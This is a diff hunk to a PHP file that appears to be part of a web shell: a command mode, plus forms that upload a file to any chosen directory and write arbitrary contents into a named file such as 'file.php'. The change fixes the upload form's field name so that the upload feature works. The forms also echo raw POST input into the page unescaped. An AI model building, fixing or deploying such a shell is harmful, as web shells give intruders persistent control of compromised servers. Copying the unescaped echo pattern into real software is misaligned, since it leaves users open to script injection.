@@ -154,7 +154,7 @@ if ($mode == "command") {
 
     <table style='width:100%'>
     <tr style='text-align:center'>
-    <th style='display:inline-block; padding-right:10%; padding-left:10%;'>upload<br><input type='text' name='saveto' value='$_POST[uplto]' placeholder='$dir'><br><input type='file' name='datupload' style='border: 1px solid #dfe4ea; background:#f1f2f6;'><br><input type='submit' name='uploadsubmit' value='upload' style='background-color: #57606f;color: #f1f2f6;'>
+    <th style='display:inline-block; padding-right:10%; padding-left:10%;'>upload<br><input type='text' name='uplto' value='$_POST[uplto]' placeholder='$dir'><br><input type='file' name='datupload' style='border: 1px solid #dfe4ea; background:#f1f2f6;'><br><input type='submit' name='uploadsubmit' value='upload' style='background-color: #57606f;color: #f1f2f6;'>
     </th>
     <th style='display:inline-block; padding-left:10%; padding-right:10%;'>save<br><input type='text' name='saveto' value='$_POST[saveto]' placeholder='$dir'><br><input type='text' name='file' value='$file' placeholder='file.php'><br><input type='submit' name='savesubmit' value='save' style='background-color: #57606f;color: #f1f2f6;'>
     </form></th>
